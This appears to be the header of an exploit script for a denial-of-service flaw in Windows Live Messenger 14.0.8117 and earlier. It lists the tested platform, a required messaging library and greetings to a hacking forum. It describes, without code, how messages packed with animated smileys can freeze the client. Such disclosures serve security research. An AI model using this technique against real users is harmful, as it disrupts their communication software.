# Software Link: http://explore.live.com/windows-live-messenger
# Version: 14.0.8117 and prior
# Tested on: Windows 7 x86

# msnlib required: http://blitiri.com.ar/p/msnlib/
# Greets: forums.hacking.org.il - <3UGUYS
# SP. thx goes to Alberto <albertito [a7] blitiri [d0t] com [d0t] ar> for
#              the msnlib library / Original msnbot example (that I modded =] )

# Description:
# Windows Live Messenger is prone to a Denial of Service attack. By sending
# specially crafted messages that contain a large number of animations ("Smileys"),
# it is possible to make WLM consume large amounts of memory and CPU while
# it attempts to render the animated images, causing it to stop responding.
